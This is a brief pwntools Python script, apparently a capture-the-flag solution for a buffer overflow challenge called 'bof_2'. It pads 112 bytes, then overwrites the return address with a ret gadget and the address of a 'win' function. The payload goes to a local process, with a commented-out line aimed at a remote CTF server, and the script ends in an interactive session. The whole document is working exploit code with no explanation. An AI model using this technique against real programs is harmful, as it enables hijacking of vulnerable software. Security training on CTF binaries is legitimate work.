from pwn import*

ret_adr=p64(0x00000000004004fe)
win_adr=p64(0x0400647)

p=process("./bof_2")
#p=remote("dragonsec.si",40002)

payload = b'A' * 108
payload += b'B' * 4
#payload+=p64(0xdeadc0de)
payload+= ret_adr
payload+=win_adr
print(payload)
#gdb.attach(p,"break vuln")
p.sendline(payload)
p.interactive()
